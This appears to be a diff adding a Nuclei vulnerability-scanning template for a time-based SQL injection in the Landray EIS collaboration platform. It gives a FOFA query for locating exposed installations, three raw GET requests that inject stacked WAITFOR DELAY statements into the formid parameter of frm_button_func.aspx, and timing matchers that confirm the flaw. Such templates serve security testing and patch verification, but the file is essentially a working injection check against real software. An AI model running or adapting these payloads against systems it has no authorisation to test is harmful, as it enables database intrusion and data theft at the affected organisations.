@@ -1,0 +1,36 @@
+id: landary-EIS-frm-button-func-sqli
+ 
+info:
+  name: 蓝凌EIS智慧协同平台-SQL注入-frm-button-func
+  author: HuanXiong
+  severity: high
+  metadata:
+    fofa-query: app="Landray-EIS智慧协同平台" || body="jquery.landray.common.js" || icon_hash="953405444"
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /frm/frm_button_func.aspx?formid=1%3BWAITFOR%20DELAY%20%270:0:2%27--  HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
+        Connection: close
+      - |
+        GET /frm/frm_button_func.aspx?formid=1%3BWAITFOR%20DELAY%20%270:0:4%27--  HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
+        Connection: close
+      - |
+        GET /frm/frm_button_func.aspx?formid=1%3BWAITFOR%20DELAY%20%270:0:6%27--  HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
+        Connection: close
+        
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - 'duration_1>=2 && duration_1<=4'
+          - 'duration_2>=4 && duration_2<=6'
+          - 'duration_3>=6 && duration_3<=8'       
